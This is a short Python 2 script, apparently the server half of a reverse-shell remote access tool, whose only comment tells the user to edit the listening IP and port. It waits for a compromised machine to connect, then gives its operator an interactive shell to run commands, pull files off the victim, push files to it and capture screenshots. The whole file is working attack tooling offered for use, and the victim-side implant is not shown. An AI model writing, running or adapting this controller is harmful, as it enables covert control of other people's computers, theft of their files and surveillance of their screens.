#!/usr/bin/python
#Linux server, edit ip and port in the 'server' function below

import socket
import json
import base64

count = 1

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        #loops back if receive more or less than 1024
        except ValueError:
            continue


def shell():
    global count
    while True:
        command = raw_input("[*] Shell:%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                filedata = reliable_recv()
                file.write(base64.b64decode(filedata))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to Upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as scrn:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == "[!]":
                    print(image_decoded)
                else:
                    scrn.write(image_decoded)
                    count += 1
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    #ipv4 tcp connection
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("xx.xx.xx.xx", 54321)) #CHANGE IP & PORT HERE
    s.listen(5)
    print "[+] Listening for Incoming Connections"
    target, ip = s.accept()
    print "[+] Connection Estabilished from: %s" % str(ip)

server()
shell()
s.close()